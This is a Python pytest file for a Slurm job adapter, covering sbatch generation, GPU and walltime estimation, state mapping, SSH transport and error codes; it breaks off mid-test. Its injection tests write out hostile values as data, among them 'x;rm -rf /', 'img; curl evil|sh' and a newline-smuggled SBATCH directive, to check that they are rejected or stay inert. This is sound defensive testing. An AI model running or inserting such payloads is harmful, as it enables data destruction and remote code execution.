"""Tests for Xcelsior Slurm adapter — job translation, sbatch generation, state mapping."""

import json
import os
import uuid
import subprocess
import sys
import tempfile

import pytest

os.environ.setdefault("XCELSIOR_API_TOKEN", "")
os.environ.setdefault("XCELSIOR_ENV", "test")

from slurm_adapter import (
    CLUSTER_PROFILES,
    GPU_VRAM_TABLE,
    SLURM_STATE_MAP,
    _estimate_gpus_needed,
    _estimate_walltime,
    _get_profile,
    _priority_to_qos,
    cancel_slurm_job,
    get_slurm_job_status,
    is_slurm_available,
    register_slurm_job,
    slurm_submit_cli,
    submit_to_slurm,
    xcelsior_job_to_sbatch,
)

# ── Cluster Profiles ─────────────────────────────────────────────────


class TestClusterProfiles:
    """Verify all cluster profiles are well-formed."""

    def test_required_profiles_exist(self):
        for name in ("nibi", "graham", "narval", "generic"):
            assert name in CLUSTER_PROFILES, f"Missing profile: {name}"

    def test_profile_keys(self):
        required_keys = {
            "partition_gpu",
            "gpu_type",
            "modules",
            "container_runtime",
            "account_env",
            "scratch_dir",
            "project_dir",
            "gpus_per_node",
        }
        for name, profile in CLUSTER_PROFILES.items():
            for key in required_keys:
                assert key in profile, f"{name} missing key: {key}"

    def test_nibi_profile(self):
        # Nibi (Graham's 2025 successor) is an H100 cluster, 8 per node.
        p = CLUSTER_PROFILES["nibi"]
        assert p["gpu_type"] == "h100"
        assert p["gpus_per_node"] == 8
        assert p["container_runtime"] == "apptainer"

    def test_graham_profile(self):
        p = CLUSTER_PROFILES["graham"]
        assert p["container_runtime"] == "apptainer"
        assert "gpus_per_node" in p

    def test_get_profile_default(self):
        profile = _get_profile()
        # Should return generic when no env is set
        assert profile is not None
        assert "partition_gpu" in profile

    def test_get_profile_by_name(self):
        profile = _get_profile("nibi")
        assert profile["gpu_type"] == "h100"


# ── GPU VRAM Table ────────────────────────────────────────────────────


class TestGPUVRAMTable:
    def test_common_gpus_present(self):
        for gpu in ["a100", "h100", "rtx_4090", "rtx_3090", "t4", "v100"]:
            assert gpu in GPU_VRAM_TABLE, f"Missing GPU: {gpu}"

    def test_a100_vram(self):
        assert GPU_VRAM_TABLE["a100"] == 40

    def test_rtx_4090_vram(self):
        assert GPU_VRAM_TABLE["rtx_4090"] == 24


# ── GPU Estimation ────────────────────────────────────────────────────


class TestEstimateGPUs:
    """Test ceil-division GPU estimation logic."""

    def test_zero_vram_returns_one(self):
        assert _estimate_gpus_needed(0, "a100") == 1

    def test_negative_vram_returns_one(self):
        assert _estimate_gpus_needed(-10, "a100") == 1

    def test_exact_fit_single_gpu(self):
        assert _estimate_gpus_needed(40, "a100") == 1

    def test_needs_two_gpus(self):
        assert _estimate_gpus_needed(60, "a100") == 2  # 60/40 = ceil 2

    def test_small_model_single_gpu(self):
        assert _estimate_gpus_needed(8, "rtx_4090") == 1

    def test_large_model_multiple_gpus(self):
        assert _estimate_gpus_needed(48, "rtx_4090") == 2  # 48/24 = 2

    def test_unknown_gpu_uses_16gb_default(self):
        assert _estimate_gpus_needed(32, "unknown_gpu") == 2  # 32/16 = 2
        assert _estimate_gpus_needed(48, "unknown_gpu") == 3  # 48/16 = 3


# ── Priority to QoS Mapping ──────────────────────────────────────────


class TestPriorityToQoS:
    def test_premium_qos(self):
        assert _priority_to_qos(90) == "premium"
        assert _priority_to_qos(100) == "premium"

    def test_normal_qos(self):
        assert _priority_to_qos(50) == "normal"
        assert _priority_to_qos(89) == "normal"

    def test_low_qos(self):
        assert _priority_to_qos(10) == "low"
        assert _priority_to_qos(49) == "low"

    def test_default_qos(self):
        assert _priority_to_qos(0) == "default"
        assert _priority_to_qos(9) == "default"
        assert _priority_to_qos(-1) == "default"


# ── Walltime Estimation ──────────────────────────────────────────────


class TestEstimateWalltime:
    def test_large_model_24h(self):
        assert _estimate_walltime("llama-70b-chat") == "24:00:00"
        assert _estimate_walltime("falcon-180b") == "24:00:00"

    def test_medium_model_12h(self):
        assert _estimate_walltime("llama-13b-finetune") == "12:00:00"
        assert _estimate_walltime("mistral-7b-v0.1") == "12:00:00"
        assert _estimate_walltime("codellama-34b") == "12:00:00"

    def test_small_model_6h(self):
        assert _estimate_walltime("llama-7b-base") == "6:00:00"
        assert _estimate_walltime("phi-2-instruct") == "6:00:00"
        assert _estimate_walltime("gemma-2b") == "6:00:00"

    def test_unknown_model_default(self):
        assert _estimate_walltime("custom-model-xyz") == "4:00:00"

    def test_custom_default(self):
        assert _estimate_walltime("custom", default="8:00:00") == "8:00:00"


# ── Slurm State Mapping ──────────────────────────────────────────────


class TestSlurmStateMap:
    """Verify all expected Slurm states map to valid Xcelsior states."""

    VALID_XCELSIOR_STATES = {
        "queued",
        "running",
        "completed",
        "failed",
        "cancelled",
        "preempted",
    }

    def test_all_states_mapped(self):
        expected_slurm = {
            "PENDING",
            "RUNNING",
            "COMPLETING",
            "COMPLETED",
            "FAILED",
            "CANCELLED",
            "TIMEOUT",
            "NODE_FAIL",
            "PREEMPTED",
            "SUSPENDED",
            "OUT_OF_MEMORY",
        }
        for state in expected_slurm:
            assert state in SLURM_STATE_MAP, f"Missing mapping: {state}"

    def test_all_values_are_valid(self):
        for slurm_state, xcelsior_state in SLURM_STATE_MAP.items():
            assert (
                xcelsior_state in self.VALID_XCELSIOR_STATES
            ), f"{slurm_state} maps to invalid state: {xcelsior_state}"

    def test_specific_mappings(self):
        assert SLURM_STATE_MAP["PENDING"] == "queued"
        assert SLURM_STATE_MAP["RUNNING"] == "running"
        assert SLURM_STATE_MAP["COMPLETED"] == "completed"
        assert SLURM_STATE_MAP["FAILED"] == "failed"
        assert SLURM_STATE_MAP["PREEMPTED"] == "preempted"
        assert SLURM_STATE_MAP["TIMEOUT"] == "failed"
        assert SLURM_STATE_MAP["OUT_OF_MEMORY"] == "failed"


# ── Job Translation (sbatch generation) ──────────────────────────────


class TestJobTranslation:
    """Test xcelsior_job_to_sbatch for various profiles and job configs."""

    def _make_job(self, **overrides):
        job = {
            "job_id": "test-123",
            "name": "llama-7b",
            "vram_needed_gb": 16,
            "priority": 50,
            "tier": "premium",
            "image": "ghcr.io/xcelsior/llama:latest",
        }
        job.update(overrides)
        return job

    def test_generates_sbatch_header(self):
        script, meta = xcelsior_job_to_sbatch(self._make_job(), "generic")
        assert script.startswith("#!/bin/bash")
        assert "#SBATCH --job-name=xcl-test-123" in script
        assert "#SBATCH --time=" in script
        assert "#SBATCH --gres=gpu:" in script

    def test_metadata_returned(self):
        script, meta = xcelsior_job_to_sbatch(self._make_job(), "nibi")
        assert meta["job_id"] == "test-123"
        assert meta["profile"] == "nibi"
        assert meta["gpu_type"] == "h100"
        assert meta["nodes"] >= 1
        assert meta["qos"] == "normal"  # priority=50

    def test_nibi_uses_apptainer(self):
        script, _ = xcelsior_job_to_sbatch(self._make_job(), "nibi")
        assert "apptainer" in script
        assert "module load" in script

    def test_generic_uses_docker(self):
        script, _ = xcelsior_job_to_sbatch(self._make_job(), "generic")
        assert "docker" in script.lower() or "Inference Script" in script

    def test_gpu_count_in_gres(self):
        job = self._make_job(vram_needed_gb=100)  # Needs 2 H100s (80GB each)
        script, meta = xcelsior_job_to_sbatch(job, "nibi")
        assert meta["num_gpus"] == 2
        # Alliance form: --gpus-per-node, never the deprecated --gres
        assert "#SBATCH --gpus-per-node=h100:2" in script
        assert "--gres" not in script

    def test_explicit_num_gpus(self):
        job = self._make_job(num_gpus=4)
        script, meta = xcelsior_job_to_sbatch(job, "nibi")
        assert meta["num_gpus"] == 4

    def test_walltime_heuristic(self):
        job = self._make_job(name="llama-70b-chat")
        _, meta = xcelsior_job_to_sbatch(job, "generic")
        assert meta["walltime"] == "24:00:00"

    def test_env_vars_in_script(self):
        script, _ = xcelsior_job_to_sbatch(self._make_job(), "generic")
        assert "XCELSIOR_JOB_ID=test-123" in script
        assert 'XCELSIOR_TIER="premium"' in script

    def test_extra_env_vars(self):
        extra = {"MY_VAR": "hello", "NUM_WORKERS": "4"}
        script, _ = xcelsior_job_to_sbatch(self._make_job(), "generic", extra_env=extra)
        assert 'MY_VAR="hello"' in script
        assert 'NUM_WORKERS="4"' in script

    def test_multi_node_allocation(self):
        # 16 GPUs on a cluster with 8 per node → 2 nodes of 8. GPU and
        # memory requests are per node, so each node asks for its share.
        job = self._make_job(num_gpus=16)
        script, meta = xcelsior_job_to_sbatch(job, "nibi")
        assert meta["nodes"] == 2
        assert meta["gpus_per_node"] == 8
        assert "#SBATCH --nodes=2" in script
        assert "#SBATCH --gpus-per-node=h100:8" in script
        assert "--gpus=" not in script
        # 4 + 240 * 8 per node, not 4 + 240 * 16 (3,844 GB) on every node
        assert "#SBATCH --mem=1924G" in script

    def test_uneven_multi_node_split_is_refused(self):
        res = submit_to_slurm(self._make_job(num_gpus=9), profile_name="nibi", dry_run=True)
        assert res["error_code"] == "invalid_job_spec"
        assert "evenly" in res["error"]

    def test_memory_calculation(self):
        job = self._make_job(num_gpus=4)
        script, _ = xcelsior_job_to_sbatch(job, "nibi")
        # one node: 4 + (240 * 4) = 964G
        assert "#SBATCH --mem=964G" in script

    def test_premium_qos_is_opt_in(self, tmp_path, monkeypatch):
        """Decision D6: no --qos unless the cluster's profile turns it on."""
        job = self._make_job(priority=95)
        script, meta = xcelsior_job_to_sbatch(job, "generic")
        assert meta["qos"] == "premium"
        assert "--qos" not in script
        path = tmp_path / "p.json"
        path.write_text(
            json.dumps(
                {
                    "profiles": {
                        "q": {
                            "name": "q",
                            "partition_gpu": "gpu",
                            "partition_cpu": "c",
                            "qos": True,
                        }
                    }
                }
            )
        )
        monkeypatch.setenv("XCELSIOR_SLURM_PROFILES_FILE", str(path))
        script, _ = xcelsior_job_to_sbatch(job, "q")
        assert "#SBATCH --qos=premium" in script

    def test_no_image_uses_inference_script(self):
        job = self._make_job(image="")
        script, _ = xcelsior_job_to_sbatch(job, "generic")
        assert "Inference Script" in script


# ── Slurm Submission (dry run) ────────────────────────────────────────


class TestSubmitDryRun:
    def test_dry_run_returns_script(self):
        job = {"job_id": "dry-1", "name": "test", "vram_needed_gb": 8}
        result = submit_to_slurm(job, profile_name="generic", dry_run=True)
        assert result["dry_run"] is True
        assert "script" in result
        assert "metadata" in result

    def test_no_slurm_returns_error(self, monkeypatch):
        monkeypatch.setattr(
            "slurm_adapter.is_slurm_available",
            lambda: False,
        )
        job = {"job_id": "no-slurm", "name": "test", "vram_needed_gb": 8}
        result = submit_to_slurm(job, profile_name="generic", dry_run=False)
        assert "error" in result


# ── Slurm CLI Wrapper ────────────────────────────────────────────────


class TestSlurmCLI:
    def test_dry_run_output(self):
        job = {"job_id": "cli-1", "name": "test-model", "vram_needed_gb": 16}
        output = slurm_submit_cli(job, profile="generic", dry_run=True)
        assert "sbatch script" in output.lower() or "SBATCH" in output


# ── Slurm Job Map Persistence ────────────────────────────────────────


class TestSlurmJobMap:
    def test_register_and_load(self, monkeypatch):
        """Mappings round-trip through PostgreSQL, not a JSON file.

        This test used to monkeypatch `SLURM_MAP_FILE` — a leftover from
        the file-backed era that migration 060 replaced. The constant is
        gone (companion §10.1: "A JSON file cannot safely coordinate
        several processes"), so the assertion now drives the real table.
        """
        import slurm_adapter
        from db import pg_transaction

        job_id = f"xcelsior-{uuid.uuid4().hex[:8]}"
        monkeypatch.setattr(slurm_adapter, "_slurm_job_map", {})
        try:
            register_slurm_job(job_id, "12345")

            slurm_adapter._slurm_job_map = {}  # prove it reloads from the DB
            slurm_adapter._load_slurm_map()
            assert slurm_adapter._slurm_job_map[job_id] == "12345"
        finally:
            with pg_transaction() as conn:
                conn.execute(
                    "DELETE FROM slurm_job_mappings WHERE xcelsior_job_id = %s",
                    (job_id,),
                )


# ── is_slurm_available ───────────────────────────────────────────────


class TestSlurmAvailability:
    def test_returns_false_when_sinfo_missing(self, monkeypatch):
        def mock_run(*args, **kwargs):
            raise FileNotFoundError("sinfo not found")

        monkeypatch.setattr(subprocess, "run", mock_run)
        assert is_slurm_available() is False


# ── get_slurm_job_status ─────────────────────────────────────────────


def _completed(stdout="", returncode=0):
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr="")


class TestSlurmJobStatus:
    def test_no_slurm_returns_error(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)

        def mock_run(argv, *a, **k):
            return _completed("", returncode=0)  # empty squeue + empty sacct

        monkeypatch.setattr(subprocess, "run", mock_run)
        result = get_slurm_job_status("12345")
        # Absence is not a verdict (accounting can lag): unknown, not failed.
        assert result["xcelsior_state"] == "unknown"
        assert result["error_code"] == "not_found"
        assert "not found" in result["error"]

    def test_running_job_parsed_from_squeue(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        # %i|%T|%M|%l|%D|%R  — running job, %R is the nodelist
        line = "12345|RUNNING|1:02:03|4:00:00|1|node007"

        def mock_run(argv, *a, **k):
            assert argv[0] == "squeue"
            return _completed(line + "\n")

        monkeypatch.setattr(subprocess, "run", mock_run)
        result = get_slurm_job_status("12345")
        assert result["slurm_state"] == "RUNNING"
        assert result["xcelsior_state"] == SLURM_STATE_MAP.get("RUNNING", "running")
        assert result["elapsed"] == "1:02:03"
        assert result["time_limit"] == "4:00:00"
        assert result["nodes"] == "1"
        assert result["reason"] == "node007"

    def test_pending_reason_with_spaces_not_truncated(self, monkeypatch):
        """Regression: %R can contain spaces; it must not be split apart."""
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        # Pending job whose reason is a multi-word parenthesised string.
        line = "12346|PENDING|0:00|8:00:00|2|(launch failed requeued held)"

        def mock_run(argv, *a, **k):
            return _completed(line + "\n")

        monkeypatch.setattr(subprocess, "run", mock_run)
        result = get_slurm_job_status("12346")
        assert result["slurm_state"] == "PENDING"
        assert result["nodes"] == "2"
        assert result["reason"] == "(launch failed requeued held)"

    def test_falls_back_to_sacct_for_completed(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        calls = {"n": 0}

        def mock_run(argv, *a, **k):
            calls["n"] += 1
            if argv[0] == "squeue":
                return _completed("")  # not in queue anymore
            # sacct --parsable2; skip the ".batch" sub-step row
            return _completed(
                "12347.batch|COMPLETED|0:30|0:0|1024K|2048K\n"
                "12347|COMPLETED|0:30|0:0|1024K|2048K\n"
            )

        monkeypatch.setattr(subprocess, "run", mock_run)
        result = get_slurm_job_status("12347")
        assert calls["n"] == 2  # squeue then sacct
        assert result["slurm_state"] == "COMPLETED"
        assert result["exit_code"] == "0:0"
        assert result["max_rss"] == "1024K"

    def test_timeout_returns_error(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)

        def mock_run(argv, *a, **k):
            raise subprocess.TimeoutExpired(cmd="squeue", timeout=10)

        monkeypatch.setattr(subprocess, "run", mock_run)
        result = get_slurm_job_status("12348")
        assert "timed out" in result["error"]


class TestCancelSlurmJob:
    def test_cancel_success(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _completed("", returncode=0))
        result = cancel_slurm_job("12345")
        assert result["cancelled"] is True

    def test_cancel_failure_surfaces_stderr(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)

        def mock_run(*a, **k):
            return subprocess.CompletedProcess(
                args=[], returncode=1, stdout="", stderr="Invalid job id"
            )

        monkeypatch.setattr(subprocess, "run", mock_run)
        result = cancel_slurm_job("99999")
        assert "Invalid job id" in result["error"]


# ══════════════════════════════════════════════════════════════════════
# v3: profiles file, CPU jobs, quoting, transport, error codes, states,
# accounting, cancel. Shapes of Slurm output below were captured from a
# real Slurm 25.11 cluster (hpc/slurm-local rehearsal), not invented.
# ══════════════════════════════════════════════════════════════════════

import slurm_adapter as _sa  # noqa: E402

LOCAL_PROFILE = {
    "name": "test local",
    "cluster_id": "xcl-test",
    "partition_gpu": "xcl",
    "partition_cpu": "xcl",
    "gpu_type": "rtx_3060",
    "gpus_per_node": 1,
    "max_walltime": "01:00:00",
    "default_walltime": "00:10:00",
    "qos": False,
    "mem_base_gb": 1,
    "mem_per_gpu_gb": 2,
    "modules": [],
    "container_runtime": "none",
    "scratch_dir": "/var/lib/xcl-slurm-test/jobs",
    "output_dir": "/var/lib/xcl-slurm-test/jobs",
}


@pytest.fixture
def local_profile(tmp_path, monkeypatch):
    path = tmp_path / "profiles.json"
    path.write_text(json.dumps({"profiles": {"xcl-test": LOCAL_PROFILE}}))
    monkeypatch.setenv(_sa.PROFILES_FILE_ENV, str(path))
    monkeypatch.delenv("XCELSIOR_SLURM_SSH_HOST", raising=False)
    monkeypatch.delenv("XCELSIOR_SLURM_SSH_OPTIONS", raising=False)
    return "xcl-test"


def _job(**kw):
    job = {"job_id": "t-1", "name": "probe", "vram_needed_gb": 0, "priority": 0, "tier": "free"}
    job.update(kw)
    return job


class _Recorder:
    """subprocess.run stand-in: records calls, replies from a queue."""

    def __init__(self, *replies):
        self.calls = []
        self.replies = list(replies)

    def __call__(self, argv, *a, **kw):
        self.calls.append({"argv": argv, **kw})
        rc, out, err = self.replies.pop(0) if self.replies else (0, "", "")
        return subprocess.CompletedProcess(args=argv, returncode=rc, stdout=out, stderr=err)


class TestProfilesV3:
    def test_unknown_profile_is_an_error_not_generic(self, local_profile):
        res = submit_to_slurm(_job(), profile_name="nibbi", dry_run=True)
        assert res["error_code"] == "unknown_profile"
        with pytest.raises(_sa.SlurmAdapterError):
            xcelsior_job_to_sbatch(_job(), "nibbi")

    def test_profiles_file_adds_profiles(self, local_profile):
        assert "xcl-test" in _sa.available_profiles()
        assert "nibi" in _sa.available_profiles()
        assert _get_profile("xcl-test")["cluster_id"] == "xcl-test"

    def test_profiles_file_missing_keys_rejected(self, tmp_path, monkeypatch):
        path = tmp_path / "bad.json"
        path.write_text(json.dumps({"profiles": {"x": {"name": "x"}}}))
        monkeypatch.setenv(_sa.PROFILES_FILE_ENV, str(path))
        with pytest.raises(_sa.SlurmAdapterError) as e:
            _sa.available_profiles()
        assert e.value.code == "invalid_profile_file"

    def test_generic_requests_untyped_gres(self):
        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=1), "generic")
        assert "#SBATCH --gres=gpu:1" in script
        assert "gpu:gpu:" not in script
        assert meta["gpu_type"] is None

    def test_gres_is_per_node_on_multi_node_jobs(self):
        # generic has 1 GPU per node: 2 GPUs is 2 nodes of gpu:1, not gpu:2
        # on each node (which asked for 4 GPUs in total).
        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=2), "generic")
        assert "#SBATCH --nodes=2" in script
        assert "#SBATCH --gres=gpu:1" in script
        assert "#SBATCH --mem=12G" in script
        assert meta["gpus_per_node"] == 1


class TestJobSpecV3:
    def test_cpu_job_uses_cpu_partition_and_no_gres(self, local_profile):
        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=0, nodelist="asus"), local_profile)
        assert "--gres" not in script
        assert "#SBATCH --partition=xcl" in script
        assert "#SBATCH --nodelist=asus" in script
        assert "#SBATCH --mem=1G" in script
        assert meta["num_gpus"] == 0

    def test_generic_cpu_job_uses_partition_cpu(self):
        script, _ = xcelsior_job_to_sbatch(_job(num_gpus=0), "generic")
        assert "#SBATCH --partition=default" in script

    def test_typed_gres_and_profile_memory(self, local_profile):
        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=1), local_profile)
        assert "#SBATCH --gres=gpu:rtx_3060:1" in script
        assert "#SBATCH --mem=3G" in script
        assert meta["cluster_id"] == "xcl-test"

    def test_output_goes_to_existing_dir_not_a_subdir_made_in_the_script(self, local_profile):
        script, meta = xcelsior_job_to_sbatch(_job(), local_profile)
        assert "#SBATCH --output=/var/lib/xcl-slurm-test/jobs/xcl-t-1-%j.out" in script
        assert "/xcelsior/" not in script.split("set -euo pipefail")[0]

    def test_profile_can_disable_qos(self, local_profile):
        script, _ = xcelsior_job_to_sbatch(_job(priority=95), local_profile)
        assert "--qos" not in script

    def test_default_walltime_and_limit(self, local_profile):
        _, meta = xcelsior_job_to_sbatch(_job(), local_profile)
        assert meta["walltime"] == "00:10:00"
        res = submit_to_slurm(_job(walltime="02:00:00"), profile_name=local_profile, dry_run=True)
        assert res["error_code"] == "walltime_exceeds_limit"

    @pytest.mark.parametrize(
        "spec,seconds",
        [("5", 300), ("1:30", 90), ("01:00:00", 3600), ("2-0", 172800), ("1-02:03:04", 93784)],
    )
    def test_walltime_parser(self, spec, seconds):
        assert _sa._walltime_seconds(spec) == seconds

    @pytest.mark.parametrize(
        "field,value",
        [
            ("job_id", "a b"),
            ("job_id", "x;rm -rf /"),
            ("nodelist", "asus\n#SBATCH --uid=0"),
            ("partition", "xcl --wrap=id"),
            ("image", "img; curl evil|sh"),
        ],
    )
    def test_injection_in_directive_fields_rejected(self, local_profile, field, value):
        res = submit_to_slurm(_job(**{field: value}), profile_name=local_profile, dry_run=True)
        assert res["error_code"] == "invalid_job_spec"

    def test_extra_env_key_validated(self, local_profile):
        res = submit_to_slurm(
            _job(), profile_name=local_profile, extra_env={"A;B": "x"}, dry_run=True
        )
        assert res["error_code"] == "invalid_job_spec"

    def test_hostile_values_stay_literal_in_bash(self, local_profile, tmp_path):
        """Run the generated export lines in bash: nothing may execute."""
        marker = tmp_path / "pwned"
        hostile = f'x"; touch {marker}; echo "$(id)`id`'
        script, _ = xcelsior_job_to_sbatch(
            _job(name=hostile, tier="$(touch " + str(marker) + ")"),
            local_profile,
            extra_env={"V": "`touch " + str(marker) + "`"},
        )
        exports = "\n".join(line for line in script.splitlines() if line.startswith("export "))
        out = subprocess.run(
            [
                "bash",
                "-c",
                exports + '\nprintf "%s|%s|%s" "$XCELSIOR_JOB_NAME" "$XCELSIOR_TIER" "$V"',
            ],
            capture_output=True,
            text=True,
            check=True,
        ).stdout
        assert out.split("|")[0] == hostile
        assert not marker.exists()

    def test_command_payload_is_one_quoted_argument(self, local_profile):
        script, _ = xcelsior_job_to_sbatch(_job(command="echo 'hi'; nvidia-smi -L"), local_profile)
        assert "bash -c 'echo '\"'\"'hi'\"'\"'; nvidia-smi -L'" in script
        assert subprocess.run(["bash", "-n"], input=script, text=True).returncode == 0

    def test_multi_node_payload_runs_under_srun(self, local_profile):
        script, _ = xcelsior_job_to_sbatch(_job(num_gpus=2, command="hostname"), local_profile)
        assert "srun bash -c hostname" in script
        single, _ = xcelsior_job_to_sbatch(_job(num_gpus=1, command="hostname"), local_profile)
        assert "srun " not in single

    def test_qos_stays_off_when_the_profile_does_not_mention_it(self, tmp_path, monkeypatch):
        path = tmp_path / "p.json"
        path.write_text(
            json.dumps(
                {"profiles": {"n": {"name": "n", "partition_gpu": "g", "partition_cpu": "c"}}}
            )
        )
        monkeypatch.setenv(_sa.PROFILES_FILE_ENV, str(path))
        script, _ = xcelsior_job_to_sbatch(_job(priority=95), "n")
        assert "--qos" not in script

    def test_comment_carries_xcelsior_id(self, local_profile):
        script, _ = xcelsior_job_to_sbatch(_job(), local_profile)
        assert "#SBATCH --comment=xcelsior:t-1" in script


class TestTransportV3:
    def test_sbatch_reads_script_from_stdin_with_parsable(self, local_profile, monkeypatch):
        rec = _Recorder((0, "42\n", ""))
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        monkeypatch.setattr(subprocess, "run", rec)
        res = submit_to_slurm(_job(), profile_name=local_profile)
        assert res["slurm_job_id"] == "42"
        assert res["cluster_id"] == "xcl-test"
        assert rec.calls[0]["argv"] == ["sbatch", "--parsable"]
        assert rec.calls[0]["input"].startswith("#!/bin/bash")
        assert "script_path" not in res

    def test_parsable_output_with_cluster_suffix(self, local_profile, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        monkeypatch.setattr(subprocess, "run", _Recorder((0, "77;xcl-local\n", "")))
        assert submit_to_slurm(_job(), profile_name=local_profile)["slurm_job_id"] == "77"

    def test_ssh_runner_shape(self, local_profile, monkeypatch):
        rec = _Recorder((0, "43\n", ""))
        monkeypatch.setattr(subprocess, "run", rec)
        runner = _sa.SlurmRunner(ssh_host="aaryn@tower", ssh_options=("-F", "/k.conf", "-p", "22"))
        res = submit_to_slurm(_job(), profile_name=local_profile, runner=runner)
        argv = rec.calls[0]["argv"]
        assert argv[:5] == ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10"]
        assert argv[-2:] == ["aaryn@tower", "sbatch --parsable"]
        assert res["slurm_job_id"] == "43"

    def test_ssh_env_prefix_is_quoted(self, monkeypatch):
        rec = _Recorder((0, "", ""))
        monkeypatch.setattr(subprocess, "run", rec)
        _sa.SlurmRunner(ssh_host="h", ssh_options=("-F", "/k.conf")).run(
            ["sacct", "-j", "1"], env={"SLURM_TIME_FORMAT": "%s"}
        )
        assert rec.calls[0]["argv"][-1] == "env SLURM_TIME_FORMAT=%s sacct -j 1"

    def test_ssh_connect_failure_is_transport_error(self, local_profile, monkeypatch):
        monkeypatch.setattr(
            subprocess, "run", _Recorder((255, "", "ssh: connect to host x: timed out"))
        )
        res = submit_to_slurm(
            _job(),
            profile_name=local_profile,
            runner=_sa.SlurmRunner(ssh_host="x", ssh_options=("-F", "/k.conf")),
        )
        assert res["error_code"] == "transport_error"

    def test_remote_run_without_its_own_ssh_config_is_refused(self, monkeypatch):
        rec = _Recorder()
        monkeypatch.setattr(subprocess, "run", rec)
        with pytest.raises(_sa.SlurmAdapterError) as e:
            _sa.SlurmRunner(ssh_host="h", ssh_options=("-i", "/k")).run(["sinfo", "--version"])
        assert e.value.code == "insecure_ssh_config"
        assert rec.calls == []  # nothing reached ssh

    def test_env_overrides_only_the_named_profile_and_keep_its_config(self, monkeypatch):
        monkeypatch.setenv("XCELSIOR_SLURM_SSH_HOST", "aaryn@127.0.0.1")
        monkeypatch.setenv("XCELSIOR_SLURM_SSH_OPTIONS", "-p 22022 -i /k")
        monkeypatch.setenv("XCELSIOR_SLURM_SSH_PROFILE", "xcl-local")
        lab = {"_key": "xcl-local", "ssh_host": "xcl-tower", "ssh_options": ["-F", "/a.conf"]}
        r = _sa.get_runner(lab)
        assert r.ssh_host == "aaryn@127.0.0.1"
        # appended, so the profile's -F survives (replacing it dropped -F)
        assert r.ssh_options == ("-F", "/a.conf", "-p", "22022", "-i", "/k")
        nibi = {"_key": "nibi", "ssh_host": "robot.nibi", "ssh_options": ["-F", "/n.conf"]}
        r = _sa.get_runner(nibi)
        assert (r.ssh_host, r.ssh_options) == ("robot.nibi", ("-F", "/n.conf"))

    def test_home_relative_options_expand(self, monkeypatch):
        monkeypatch.setenv("HOME", "/home/op")
        r = _sa.get_runner({"ssh_host": "h", "ssh_options": ["-F", "~/.ssh/x.conf"]})
        assert r.ssh_options == ("-F", "/home/op/.ssh/x.conf")

    def test_env_override_without_a_named_profile_is_refused(self, monkeypatch):
        monkeypatch.setenv("XCELSIOR_SLURM_SSH_HOST", "aaryn@127.0.0.1")
        monkeypatch.delenv("XCELSIOR_SLURM_SSH_PROFILE", raising=False)
        with pytest.raises(_sa.SlurmAdapterError) as e:
            _sa.get_runner({"_key": "nibi"})
        assert e.value.code == "ambiguous_ssh_override"


class TestControllerHealth:
    @pytest.mark.parametrize(
        "stdout,state",
        [
            ("Slurmctld(primary) at tower is UP\n", "up"),
            ("Slurmctld(primary) at a is DOWN\nSlurmctld(backup) at b is UP\n", "up"),
            ("Slurmctld(primary) at tower is DOWN\n", "down"),
        ],
    )
    def test_scontrol_ping_is_parsed(self, local_profile, monkeypatch, stdout, state):
        rec = _Recorder((0, stdout, ""))
        monkeypatch.setattr(subprocess, "run", rec)
        res = _sa.controller_health(profile_name=local_profile)
        assert rec.calls[0]["argv"] == ["scontrol", "ping"]
        assert res["controller"] == state
        assert res["controllers"][0]["role"] == "primary"

    def test_unrecognised_output_is_an_error_not_a_guess(self, local_profile, monkeypatch):
        monkeypatch.setattr(subprocess, "run", _Recorder((1, "", "scontrol: error: x")))
        assert _sa.controller_health(profile_name=local_profile)["error_code"] == "unparseable_ping"


class TestErrorClassificationV3:
    # stderr lines as Slurm 25.11 prints them (captured in the rehearsal)
    @pytest.mark.parametrize(
        "stderr,code",
        [
            (
                "sbatch: error: Batch job submission failed: Requested node configuration is not available",
                "unsatisfiable_request",
            ),
            (
                "sbatch: error: invalid partition specified: nosuchpart\n"
                "sbatch: error: Batch job submission failed: Invalid partition name specified",
                "invalid_partition",
            ),
            (
                "sbatch: error: Batch job submission failed: Requested time limit is invalid (missing or exceeds some limit)",
                "walltime_exceeds_limit",
            ),
            (
                "sbatch: error: Batch job submission failed: Invalid node name specified",
                "invalid_nodelist",
            ),
            (
                "sbatch: error: Batch job submission failed: Invalid qos specification",
                "invalid_qos",
            ),
            (
                "sbatch: error: Batch job submission failed: Unable to contact slurm controller",
                "controller_unreachable",
            ),
            ("something new", "sbatch_rejected"),
        ],
    )
    def test_codes(self, stderr, code):
        assert _sa.classify_slurm_error(stderr) == code

    def test_rejection_returns_code_and_no_job(self, local_profile, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        monkeypatch.setattr(
            subprocess,
            "run",
            _Recorder(
                (
                    1,
                    "",
                    "sbatch: error: Batch job submission failed: Invalid partition name specified",
                )
            ),
        )
        res = submit_to_slurm(_job(partition="nosuchpart"), profile_name=local_profile)
        assert res["error_code"] == "invalid_partition"
        assert "slurm_job_id" not in res


class TestStatesV3:
    def test_cancelled_by_uid_from_sacct_is_cancelled(self, monkeypatch):
        """Regression: sacct prints 'CANCELLED by 1000'; it used to map to failed."""
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)

        def run(argv, *a, **k):
            if argv[0] == "squeue":
                return _completed("", returncode=1)
            return _completed("9|CANCELLED by 1000|00:00:00|0:0||\n")

        monkeypatch.setattr(subprocess, "run", run)
